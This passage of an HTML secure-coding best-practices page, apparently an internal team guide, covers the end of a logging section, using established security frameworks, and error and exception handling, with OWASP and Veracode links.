                        <li>Don’t log opt-out data, session IDs, or hash value of passwords, or sensitive or private data including credit card or Social Security numbers. </li>
                        <li>Perform encoding on untrusted data before logging it to protect from log injection, also referred to as log forging.</li>
                        <li>Log at an optimal level. Too much or too little logging heightens risk.</li>
                    </ul>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Logging_Cheat_Sheet" target="_blank">OWASP Logging Cheat Sheet</a></li>
                    </ul>
                </div>
            </div>
            <div id="nine" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">9</div>
                    <h2>Leverage Security Frameworks and Libraries</h2>
                </div>
                <div class="bp-body">
                    <p>You can waste a lot of time — and unintentionally create security flaws — by developing security controls from scratch for every web application you’re
                        working on. To avoid that, take advantage of established security frameworks and, when necessary, respected third-party libraries that provide tested and
                        proven security controls. 
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Use existing secure framework features rather than using new tools, such as third-party libraries.</li>
                        <li>Because some frameworks have known security flaws, build in additional controls or security protections as needed.</li>
                        <li>Use web application security frameworks, including Spring Security, Apache Shiro, Django Security, and Flask security.</li>
                        <li>Regularly check (at least once per quarter) for security flaws, and keep frameworks and libraries up to date. By understanding not just the status of the component but whether or not a
                            vulnerable method is being called, organizations can pinpoint their component risk and prioritize fixes based on the riskiest uses of components.  We are fortunate in that our 
                            automated Checkmarx scans will check for out of date or vulnerable libraries with each check-in.</li>
                        <li>Keep all frameworks updated with the latest patches.</li>
                    </ul>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://info.veracode.com/webinars-not-a-free-lunch-a-best-practice-guide-on-how-to-get-a-handle-on-your-open-source-risk.html" target="_blank">A Best Practice Guide to Managing Your Open Source Risk</a></li>
                    </ul>
                </div>
            </div>
            <div id="ten" class="best-practices-block">
                <div class="bp-header">
                    <div class="id">10</div>
                    <h2>Monitor Error and Exception Handling</h2>
                </div>
                <div class="bp-body">
                    <p>Error and exception handling isn’t exciting, but like input validation, it is a crucial element of defensive coding. Mistakes in error and exception handling can cause
                        leakage of information to attackers, who can use it to better understand your platform or design. Even small mistakes in error handling have been found to
                        cause catastrophic failures in distributed systems.
                    </p>
                    <hr>
                    <h5>GUIDANCE</h5>
                    <ul class="checkItem">
                        <li>Conduct careful code reviews at the team and organizational levels and use negative testing, including exploratory testing and pen testing, fuzzing, and fault injection, to identify problems in
                            error handling.</li>
                        <li>Manage exceptions in a centralized manner to avoid duplicated try/catch blocks in the code. In addition, verify that all unexpected behaviors are
                            correctly handled inside the application.</li>
                        <li>Developers should also use a standard exception handling architecture to prevent information leakage from occurring. This architecture should be used and shared across the entire development 
                            team. <b>All developers should handle their errors the same way</b>.</li>
                        <li>Confirm that every error messages sent to users aren't susceptible to critical data leaks, and that exceptions are logged in a way that delivers enough information
                            for QA, forensics, or incident response teams to understand the problem.</li>
                        <li>Always turn custom Errors mode on for Web Applications to prevent showing the "yellow screen of death" and thus unintentionally providing information leakae about the application.</li>
                    </ul>
                    <hr>
                    <h5>ADDITIONAL RESOURCES</h5>
                    <ul class="resource">
                        <li><a href="https://www.owasp.org/index.php/Error_Handling" target="_blank">OWASP Code Review Guide: Error Handling</a></li>
                    </ul>
                </div>
            </div>
            <br><br>
        </div>
    </body>
</html>
